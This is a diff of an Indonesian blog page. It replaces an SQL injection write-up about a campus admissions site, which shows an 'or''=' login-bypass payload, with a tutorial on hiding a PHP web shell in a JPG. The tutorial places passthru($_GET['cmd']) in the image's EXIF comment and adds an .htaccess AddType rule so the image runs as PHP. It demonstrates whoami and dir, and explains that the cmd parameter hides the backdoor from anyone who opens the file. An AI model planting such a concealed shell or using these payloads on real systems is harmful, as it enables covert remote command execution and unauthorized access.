@@ -8,39 +8,37 @@
 <meta name="generator" content="Hugo 0.56.3 with theme Tranquilpeak 0.4.8-BETA">
 <meta name="author" content="Raka Kuswanto">
 <meta name="keywords" content="">
-<meta name="description" content="&ldquo;Bug lagi, bug lagi!.&rdquo;Sebenarnya memang tidak ada website yang dapat 100 persen aman dari celah keamanan, contohnya pada kasus yang akan saya ceritakan kali ini. Bug dapat muncul dari tempat yang mungkin tidak diduga oleh si pembuat website.">
+<meta name="description" content="Ditulisan kali ini saya akan membahas bagaimana sebuah teknik steganografi dapat digunakan untuk menyembunyikan perintah php dalam sebuah gambar jpg dan dapat dijalankan walaupun ekstensi file tersebut tidak diubah. penasaran bukan ? file berformat .jpg ternyata dapat melakukan perintah file PHP.">
 
 
-<meta property="og:description" content="&ldquo;Bug lagi, bug lagi!.&rdquo;Sebenarnya memang tidak ada website yang dapat 100 persen aman dari celah keamanan, contohnya pada kasus yang akan saya ceritakan kali ini. Bug dapat muncul dari tempat yang mungkin tidak diduga oleh si pembuat website.">
+<meta property="og:description" content="Ditulisan kali ini saya akan membahas bagaimana sebuah teknik steganografi dapat digunakan untuk menyembunyikan perintah php dalam sebuah gambar jpg dan dapat dijalankan walaupun ekstensi file tersebut tidak diubah. penasaran bukan ? file berformat .jpg ternyata dapat melakukan perintah file PHP.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL Injection di Subdomain Website Kampus">
-<meta name="twitter:title" content="SQL Injection di Subdomain Website Kampus">
-<meta property="og:url" content="https://rakakuswanto.github.io/2020/06/sql-injection-di-subdomain-website-kampus/">
-<meta property="twitter:url" content="https://rakakuswanto.github.io/2020/06/sql-injection-di-subdomain-website-kampus/">
+<meta property="og:title" content="Menyembunyikan File PHP Kedalam File JPG">
+<meta name="twitter:title" content="Menyembunyikan File PHP Kedalam File JPG">
+<meta property="og:url" content="https://rakakuswanto.github.io/2020/06/menyembunyikan-file-php-kedalam-file-jpg/">
+<meta property="twitter:url" content="https://rakakuswanto.github.io/2020/06/menyembunyikan-file-php-kedalam-file-jpg/">
 <meta property="og:site_name" content="Catatan Raka Kuswanto">
-<meta property="og:description" content="&ldquo;Bug lagi, bug lagi!.&rdquo;Sebenarnya memang tidak ada website yang dapat 100 persen aman dari celah keamanan, contohnya pada kasus yang akan saya ceritakan kali ini. Bug dapat muncul dari tempat yang mungkin tidak diduga oleh si pembuat website.">
-<meta name="twitter:description" content="&ldquo;Bug lagi, bug lagi!.&rdquo;Sebenarnya memang tidak ada website yang dapat 100 persen aman dari celah keamanan, contohnya pada kasus yang akan saya ceritakan kali ini. Bug dapat muncul dari tempat yang mungkin tidak diduga oleh si pembuat website.">
+<meta property="og:description" content="Ditulisan kali ini saya akan membahas bagaimana sebuah teknik steganografi dapat digunakan untuk menyembunyikan perintah php dalam sebuah gambar jpg dan dapat dijalankan walaupun ekstensi file tersebut tidak diubah. penasaran bukan ? file berformat .jpg ternyata dapat melakukan perintah file PHP.">
+<meta name="twitter:description" content="Ditulisan kali ini saya akan membahas bagaimana sebuah teknik steganografi dapat digunakan untuk menyembunyikan perintah php dalam sebuah gambar jpg dan dapat dijalankan walaupun ekstensi file tersebut tidak diubah. penasaran bukan ? file berformat .jpg ternyata dapat melakukan perintah file PHP.">
 <meta property="og:locale" content="en-us">
 
   
-    <meta property="article:published_time" content="2020-06-19T00:00:00">
+    <meta property="article:published_time" content="2020-06-26T00:00:00">
   
   
-    <meta property="article:modified_time" content="2020-06-19T00:00:00">
+    <meta property="article:modified_time" content="2020-06-26T00:00:00">
   
   
   
     
-      <meta property="article:section" content="stories">
+      <meta property="article:section" content="Learn">
     
   
   
     
       <meta property="article:tag" content="security">
     
-      <meta property="article:tag" content="write up">
-    
-      <meta property="article:tag" content="sql">
+      <meta property="article:tag" content="steganography">
     
   
 
@@ -53,12 +51,12 @@
 
 
 
-  <meta property="og:image" content="//images.unsplash.com/photo-1542831371-d531d36971e6?crop=entropy&cs=tinysrgb&fit=crop&fm=jpg&h=140&ixid=eyJhcHBfaWQiOjF9&ixlib=rb-1.2.1&q=80&w=140">
-  <meta property="twitter:image" content="//images.unsplash.com/photo-1542831371-d531d36971e6?crop=entropy&cs=tinysrgb&fit=crop&fm=jpg&h=140&ixid=eyJhcHBfaWQiOjF9&ixlib=rb-1.2.1&q=80&w=140">
+  <meta property="og:image" content="//images.unsplash.com/photo-1536242918817-db5e93c7a0e4?crop=entropy&cs=tinysrgb&fit=crop&fm=jpg&h=140&ixid=eyJhcHBfaWQiOjF9&ixlib=rb-1.2.1&q=80&w=140">
+  <meta property="twitter:image" content="//images.unsplash.com/photo-1536242918817-db5e93c7a0e4?crop=entropy&cs=tinysrgb&fit=crop&fm=jpg&h=140&ixid=eyJhcHBfaWQiOjF9&ixlib=rb-1.2.1&q=80&w=140">
 
 
-  <meta property="og:image" content="//images.unsplash.com/photo-1542831371-d531d36971e6?crop=entropy&cs=tinysrgb&fit=crop&fm=jpg&h=1820&ixid=eyJhcHBfaWQiOjF9&ixlib=rb-1.2.1&q=80&w=1920">
-  <meta property="twitter:image" content="//images.unsplash.com/photo-1542831371-d531d36971e6?crop=entropy&cs=tinysrgb&fit=crop&fm=jpg&h=1820&ixid=eyJhcHBfaWQiOjF9&ixlib=rb-1.2.1&q=80&w=1920">
+  <meta property="og:image" content="//images.unsplash.com/photo-1536242918817-db5e93c7a0e4?crop=entropy&cs=tinysrgb&fit=crop&fm=jpg&h=1820&ixid=eyJhcHBfaWQiOjF9&ixlib=rb-1.2.1&q=80&w=1920">
+  <meta property="twitter:image" content="//images.unsplash.com/photo-1536242918817-db5e93c7a0e4?crop=entropy&cs=tinysrgb&fit=crop&fm=jpg&h=1820&ixid=eyJhcHBfaWQiOjF9&ixlib=rb-1.2.1&q=80&w=1920">
 
 
 
@@ -67,14 +65,14 @@
   <meta property="twitter:image" content="https://www.gravatar.com/avatar/95959092febe443d9cf735e5e41b8398?s=640">
 
 
-    <title>SQL Injection di Subdomain Website Kampus</title>
+    <title>Menyembunyikan File PHP Kedalam File JPG</title>
 
     <link rel="icon" href="https://rakakuswanto.github.io/favicon.png">
     
 
     
 
-    <link rel="canonical" href="https://rakakuswanto.github.io/2020/06/sql-injection-di-subdomain-website-kampus/">
+    <link rel="canonical" href="https://rakakuswanto.github.io/2020/06/menyembunyikan-file-php-kedalam-file-jpg/">
 
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
@@ -229,21 +227,21 @@ if (!doNotTrack) {
   <div class="post-header-cover
               text-left
               "
-       style="background-image:url('//images.unsplash.com/photo-1542831371-d531d36971e6?crop=entropy&amp;cs=tinysrgb&amp;fit=crop&amp;fm=jpg&amp;h=1820&amp;ixid=eyJhcHBfaWQiOjF9&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1920')"
+       style="background-image:url('//images.unsplash.com/photo-1536242918817-db5e93c7a0e4?crop=entropy&amp;cs=tinysrgb&amp;fit=crop&amp;fm=jpg&amp;h=1820&amp;ixid=eyJhcHBfaWQiOjF9&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1920')"
        data-behavior="4">
     
       <div class="post-header main-content-wrap text-left">
   
     <h1 class="post-title" itemprop="headline">
-      SQL Injection di Subdomain Website Kampus
+      Menyembunyikan File PHP Kedalam File JPG
     </h1>
   
   
   <div class="postShorten-meta post-meta">
     
-      <time itemprop="datePublished" datetime="2020-06-19T00:00:00Z">
+      <time itemprop="datePublished" datetime="2020-06-26T00:00:00Z">
         
-  June 19, 2020
+  June 26, 2020
 
       </time>
     
@@ -252,7 +250,7 @@ if (!doNotTrack) {
   
     <span>in</span>
     
-      <a class="category-link" href="https://rakakuswanto.github.io/categories/stories">stories</a>
+      <a class="category-link" href="https://rakakuswanto.github.io/categories/learn">Learn</a>
     
   
 
@@ -272,81 +270,184 @@ if (!doNotTrack) {
           
           <div class="post-content markdown" itemprop="articleBody">
             <div class="main-content-wrap">
-              <p>&ldquo;Bug lagi, bug lagi!.&rdquo;<br>Sebenarnya memang tidak ada website yang dapat 100 persen aman dari celah keamanan, contohnya pada kasus yang akan saya ceritakan kali ini. Bug dapat muncul dari tempat yang mungkin tidak diduga oleh si pembuat website.</p>
+              <p>Ditulisan kali ini saya akan membahas bagaimana sebuah teknik steganografi dapat digunakan untuk menyembunyikan perintah php dalam sebuah gambar jpg dan dapat dijalankan walaupun ekstensi file tersebut tidak diubah. penasaran bukan ? file berformat .jpg ternyata dapat melakukan perintah file PHP.</p>
 
 <h1 id="table-of-contents">Table of Contents</h1><nav id="TableOfContents">
 <ul>
-<li><a href="#pendahuluan">Pendahuluan</a></li>
-<li><a href="#analisa">Analisa</a></li>
-<li><a href="#sql-injection">SQL Injection</a></li>
-<li><a href="#kesimpulan">Kesimpulan</a>
-<ul>
-<li><a href="#kesalahan">Kesalahan</a></li>
-<li><a href="#penanganan">Penanganan</a></li>
-</ul></li>
+<li><a href="#bahan-bahan">Bahan - Bahan</a></li>
+<li><a href="#mulai-eksekusi">Mulai Eksekusi</a></li>
 </ul>
 </nav>
 
-<h1 id="pendahuluan">Pendahuluan</h1>
+<hr>
 
-<p>Bug yang kali ini akan saya bahas adalah bug yang terdapat pada salah satu subdomain milik kampus saya berkuliah, jadi pihak kampus saya itu memiliki sebuah sistem untuk menangani proses penerimaan mahasiswa baru secara online, sistem tersebut memiliki desain yang cukup modern dan simpel.
-Selain itu, website ini juga memiliki fungsi penerimaan mahasiswa baru (PMB) secara umumnya seperti fungsi daftar, registrasi dan lain-lain yang berhubungan dengan pendaftaran kuliah.</p>
+<p>Mungkin dari beberapa pembaca blog ini ada yang belum mengetahui teknik ini, sebenarnya teknik ini sudah banyak beredar di internet, namun saya mencoba menjelaskan menggunakan versi saya sendiri. Inti dari tulisan ini bukan untuk menggurui namun karena saya ingin berbagi pengetahuan, jadi jika ada yang kurang mohon dimaklumi.</p>
 
-<p><img src="https://rakakuswanto.github.io/images/2020/06/19/pmb.png" alt="" /></p>
+<h1 id="bahan-bahan">Bahan - Bahan</h1>
 
-<p>Namun ada fungsi yang cukup unik, yaitu fungsi daftar secara &ldquo;khusus&rdquo;, fungsi tersebut digunakan oleh mahasiswa/dosen/pihak yang berhubungan dengan kampus untuk mendaftarkan teman/keluarga nya agar daftar ke kampus tersebut dengan maksud mendapatkan keuntungan, ya keuntungan karena pada saat daftar secara khusus calon mahasiswa memerlukan sebuah kode refferal atau kode referensi, sehingga pemilik kode tersebut mendapatkan imbalan/keuntungan.</p>
+<hr>
 
-<h1 id="analisa">Analisa</h1>
+<p><center><img src="https://media.giphy.com/media/a7NBvg3Ss8UYo/giphy.gif" alt="" /></center><hr></p>
 
-<p>Penemuan bug jenis SQL injection pada website ini sudah dua kali saya temukan, sebelumnya kurang lebih di tahun 2016 saya menemukan bug SQL Injection untuk melakukan &ldquo;bypass login&rdquo; pada website pendaftaran ini, sudah saya laporkan namun sepertinya pihak dari kampus masih kurang memahami tentang pentingnya keamanan pada website. Kembali ke pembahasan, jadi fokus saya tertuju pada fungsi pendaftaran khusus.</p>
-
-<p><img src="https://rakakuswanto.github.io/images/2020/06/19/pmb-khusus.png" alt="" /></p>
-
-<p>Yang pertama kali saya lakukan adalah mengecek bagaimana fungsi yang seharusnya terjadi pada saat menjalankan fungsi pendaftaran khusus.</p>
-
-<p><img src="https://rakakuswanto.github.io/images/2020/06/19/pmb-tes.png" alt="" /></p>
-
-<p>Ternyata jika saya mengisikan no referensi yang salah akan memunculkan sebuah pesan kesalahan.</p>
-
-<p><img src="https://rakakuswanto.github.io/images/2020/06/19/pmb-salah.png" alt="" /></p>
-
-<h1 id="sql-injection">SQL Injection</h1>
-
-<p>Setelah mendapatkan pesan kesalahan, lalu saya menggunakan &ldquo;mantra khusus&rdquo; untuk mengecek apakah ada peluang untuk injeksi melalui parameter no referensi.
-no referensi yang asalnya menggunakan nomor,</p>
-
-<p><img src="https://rakakuswanto.github.io/images/2020/06/19/noawal.png" alt="" /></p>
-
-<p>diubah menjadi <b>&lsquo;or&rdquo;=&rsquo;</b></p>
-
-<p><img src="https://rakakuswanto.github.io/images/2020/06/19/noakhir.png" alt="" /></p>
-
-<p>dan benar saja, terdapat bug SQL Injection pada parameter inputan no referensi</p>
-
-<p><img src="https://rakakuswanto.github.io/images/2020/06/19/pmb-sql.png" alt="" /></p>
-
-<p>Seperti yang dapat dilihat pada gambar diatas, sistem tidak menampilkan pesan eror, padahal no referensi yang diinputkan tidak sesuai dengan no referensi yang ada.</p>
-
-<p><img src="https://rakakuswanto.github.io/images/2020/06/19/pmb-dashboard.png" alt="" /></p>
-
-<h1 id="kesimpulan">Kesimpulan</h1>
-
-<h2 id="kesalahan">Kesalahan</h2>
-
+<p>Perlengkapan yang dibutuhkan oleh kita yaitu :
 <ul>
-<li>Inputan tidak dibersihkan dari karakter - karakter berbahaya, terbukti pada saat memasukan tanda petik <b>&lsquo;</b> sistem langsung memunculkan pesan eror</li>
-</ul>
+<li>Teks editor (Notepad / Notepad++ / lain-lain)</li>
+<li>File gambar yang akan dimasukan perintah PHP</li>
+<li>Exif Editor, pada bahasan ini saya menggunakan exif editor dari <a href='https://www.colorpilot.com/exif.html'>colorpilot</a></li>
+<li>XAMPP / LAMPP / Server</li>
+</ul></p>
 
-<p><img src="https://rakakuswanto.github.io/images/2020/06/19/error.png" alt="" /></p>
+<h1 id="mulai-eksekusi">Mulai Eksekusi</h1>
 
-<h2 id="penanganan">Penanganan</h2>
+<p>Setelah bahan-bahan disiapkan, selanjutnya kita mulai pada tahap pertama yaitu,</p>
 
-<ul>
-<li>Untuk mengatasi masalah SQL Injection developer website dapat menggunakan fungsi <b>mysql_real_escape_string</b> atau mengubah terlebih dahulu inputan parameter kedalam bentuk enkripsi.</li>
-<li>Sebaiknya matikan fitur error reporting pada website production.</li>
-</ul>
+<p>Buka <b>aplikasi exif editor</b></p>
 
-<p>Note : Bug ini telah diperbaiki.</p>
+<p><img src="https://rakakuswanto.github.io/images/2020/06/26/exif.png" alt="" /></p>
+
+<p>Lalu pilih file gambar yang akan digunakan untuk menyembunyikan perintah PHP. Disini saya menggunakan file bernama <b>kakashi.jpg</b>.</p>
+
+<p><img src="https://rakakuswanto.github.io/images/2020/06/26/exif-pilih.png" alt="" /></p>
+
+<p><b>Double Click</b> pada file gambar yang akan kita gunakan.</p>
+
+<p><img src="https://rakakuswanto.github.io/images/2020/06/26/exif-menu.png" alt="" /></p>
+
+<p>Dan tampilan aplikasi exif editor pun memunculkan menu, kita pilih kolom <b>Comment</b>.
+isi kolom <b>Comment</b> dengan perintah PHP.</p>
+
+
+  
+    
+  
+  
+    
+  
+  
+  
+
+
+<figure class="highlight php language-php">
+  <figcaption>
+    
+      <span>Perintah PHP</span>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-php"><code class="php">
+&lt;?php passthru(isset($_GET[&#39;cmd&#39;]) ? $_GET[&#39;cmd&#39;] : &#34;echo &#39;&#39;&#34;); __halt_compiler();
+</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<p><img src="https://rakakuswanto.github.io/images/2020/06/26/exif-isi.png" alt="" /></p>
+
+<p>Klik <b>OK</b></p>
+
+<p>Tahap selanjutnya simpan file gambar tersebut pada server, disini saya menggunakan server localhost.</p>
+
+<p>Lalu tambahkan file <b>.htaccess</b> dan isikan tulisan dibawah ini.</p>
+
+<p>
+  
+    
+  
+  
+    
+  
+  
+  
+
+
+<figure class="highlight php language-php">
+  <figcaption>
+    
+      <span>.htaccess</span>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-php"><code class="php">
+AddType application/x-httpd-php .jpg
+</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+fungsi nya untuk meng-override sistem, jika file ber-ekstensi .jpg dapat dijalankan menggunakan compiler PHP.</p>
+
+<p><img src="https://rakakuswanto.github.io/images/2020/06/26/kakashi-sebelum.png" alt="" />
+<center>sebelum menambahkan file <b>.htaccess</b></center></p>
+
+<p><img src="https://rakakuswanto.github.io/images/2020/06/26/kakashi-sesudah.png" alt="" />
+<center>sesudah menambahkan file <b>.htaccess</b></center></p>
+
+<p>&ldquo;Lho? kok kosong? Mana fungsi PHPnya?&rdquo;, tunggu dulu hehe, disini kita kurang menambahkan parameter <b>cmd</b>.
+&ldquo;Kenapa parameter cmd?&rdquo;, jadi berdasarkan kode dibawah ini, kita memerlukan parameter cmd, &ldquo;kenapa perlu menggunakan parameter cmd?&rdquo;, guna nya agar menyembunyikan fungsi yang kita tambahkan pada file gambar tersebut, jadi jika ada orang yang membuka file kita, maka yang dilihat hanya tulisan tidak jelas seperti gambar diatas.</p>
+
+
+  
+    
+  
+  
+    
+  
+  
+  
+
+
+<figure class="highlight php language-php">
+  <figcaption>
+    
+      <span>Perintah PHP</span>
+    
+  </figcaption>
+  <table>
+    <tbody>
+      <tr>
+        <td class="gutter">
+          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
+        </td>
+        <td class="code">
+          <pre class="code-highlight language-php"><code class="php">
+&lt;?php passthru(isset($_GET[&#39;cmd&#39;]) ? $_GET[&#39;cmd&#39;] : &#34;echo &#39;&#39;&#34;); __halt_compiler();
+</code></pre>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+
+<p>Kita coba menambahkan parameter cmd, daaaaaan&hellip;.</p>
+
+<p><img src="https://rakakuswanto.github.io/images/2020/06/26/exif-hasil.png" alt="" /></p>
+
+<p><b>Taraaaaaangg&hellip;.!!</b>, akhirnya kita dapat menjalankan perintah PHP melalui file gambar menggunakan command <b>whoami</b>, terdengar seperti hekeur bukan ? hahahaha</p>
+
+<p><center><img src="https://media.giphy.com/media/115BJle6N2Av0A/giphy.gif" alt="" /></center></p>
+
+<p>kita coba menggunakan fungsi lain, seperti command <b>dir</b></p>
+
+<p><img src="https://rakakuswanto.github.io/images/2020/06/26/exif-hasil-dir.png" alt="" /></p>
+
+<p>Begitulah cara menyembunyikan perintah PHP kedalam sebuah gambar, silahkan berkomentar jika ada yang masih membingungkan.</p>
+
+<p>Terimakasih.</p>
               
             </div>
           </div>
@@ -360,9 +461,7 @@ no referensi yang asalnya menggunakan nomor,</p>
                     
   <a class="tag tag--primary tag--small" href="https://rakakuswanto.github.io/tags/security/">security</a>
 
-  <a class="tag tag--primary tag--small" href="https://rakakuswanto.github.io/tags/write-up/">write up</a>
-
-  <a class="tag tag--primary tag--small" href="https://rakakuswanto.github.io/tags/sql/">sql</a>
+  <a class="tag tag--primary tag--small" href="https://rakakuswanto.github.io/tags/steganography/">steganography</a>
 
 
 
@@ -393,7 +492,7 @@ wpac_init.push({widget: 'Comment', id: 25811});
           
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://rakakuswanto.github.io/2020/06/menyembunyikan-file-php-kedalam-file-jpg/" data-tooltip="Menyembunyikan File PHP Kedalam File JPG">
+                <a class="post-action-btn btn btn--disabled">
               
                   <i class="fa fa-angle-left"></i>
                   <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
@@ -401,7 +500,7 @@ wpac_init.push({widget: 'Comment', id: 25811});
             </li>
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://rakakuswanto.github.io/2020/06/reflected-xss-pada-website-e-learning/" data-tooltip="Reflected XSS Pada Website E-learning">
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://rakakuswanto.github.io/2020/06/sql-injection-di-subdomain-website-kampus/" data-tooltip="SQL Injection di Subdomain Website Kampus">
               
                   <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
                   <i class="fa fa-angle-right"></i>
@@ -419,19 +518,19 @@ wpac_init.push({widget: 'Comment', id: 25811});
         </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://rakakuswanto.github.io/2020/06/sql-injection-di-subdomain-website-kampus/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://rakakuswanto.github.io/2020/06/menyembunyikan-file-php-kedalam-file-jpg/">
               <i class="fa fa-facebook-official"></i>
             </a>
           </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://rakakuswanto.github.io/2020/06/sql-injection-di-subdomain-website-kampus/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://rakakuswanto.github.io/2020/06/menyembunyikan-file-php-kedalam-file-jpg/">
               <i class="fa fa-twitter"></i>
             </a>
           </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://rakakuswanto.github.io/2020/06/sql-injection-di-subdomain-website-kampus/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://rakakuswanto.github.io/2020/06/menyembunyikan-file-php-kedalam-file-jpg/">
               <i class="fa fa-google-plus"></i>
             </a>
           </li>
@@ -469,7 +568,7 @@ wpac_init.push({widget: 'Comment', id: 25811});
           
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://rakakuswanto.github.io/2020/06/menyembunyikan-file-php-kedalam-file-jpg/" data-tooltip="Menyembunyikan File PHP Kedalam File JPG">
+                <a class="post-action-btn btn btn--disabled">
               
                   <i class="fa fa-angle-left"></i>
                   <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
@@ -477,7 +576,7 @@ wpac_init.push({widget: 'Comment', id: 25811});
             </li>
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://rakakuswanto.github.io/2020/06/reflected-xss-pada-website-e-learning/" data-tooltip="Reflected XSS Pada Website E-learning">
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://rakakuswanto.github.io/2020/06/sql-injection-di-subdomain-website-kampus/" data-tooltip="SQL Injection di Subdomain Website Kampus">
               
                   <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
                   <i class="fa fa-angle-right"></i>
@@ -495,19 +594,19 @@ wpac_init.push({widget: 'Comment', id: 25811});
         </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://rakakuswanto.github.io/2020/06/sql-injection-di-subdomain-website-kampus/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://rakakuswanto.github.io/2020/06/menyembunyikan-file-php-kedalam-file-jpg/">
               <i class="fa fa-facebook-official"></i>
             </a>
           </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://rakakuswanto.github.io/2020/06/sql-injection-di-subdomain-website-kampus/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://rakakuswanto.github.io/2020/06/menyembunyikan-file-php-kedalam-file-jpg/">
               <i class="fa fa-twitter"></i>
             </a>
           </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://rakakuswanto.github.io/2020/06/sql-injection-di-subdomain-website-kampus/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://rakakuswanto.github.io/2020/06/menyembunyikan-file-php-kedalam-file-jpg/">
               <i class="fa fa-google-plus"></i>
             </a>
           </li>
@@ -531,19 +630,19 @@ wpac_init.push({widget: 'Comment', id: 25811});
   <ul class="share-options">
     
       <li class="share-option">
-        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Frakakuswanto.github.io%2F2020%2F06%2Fsql-injection-di-subdomain-website-kampus%2F">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Frakakuswanto.github.io%2F2020%2F06%2Fmenyembunyikan-file-php-kedalam-file-jpg%2F">
           <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
         </a>
       </li>
     
       <li class="share-option">
-        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Frakakuswanto.github.io%2F2020%2F06%2Fsql-injection-di-subdomain-website-kampus%2F">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Frakakuswanto.github.io%2F2020%2F06%2Fmenyembunyikan-file-php-kedalam-file-jpg%2F">
           <i class="fa fa-twitter"></i><span>Share on Twitter</span>
         </a>
       </li>
     
       <li class="share-option">
-        <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3A%2F%2Frakakuswanto.github.io%2F2020%2F06%2Fsql-injection-di-subdomain-website-kampus%2F">
+        <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3A%2F%2Frakakuswanto.github.io%2F2020%2F06%2Fmenyembunyikan-file-php-kedalam-file-jpg%2F">
           <i class="fa fa-google-plus"></i><span>Share on Google&#43;</span>
         </a>
       </li>
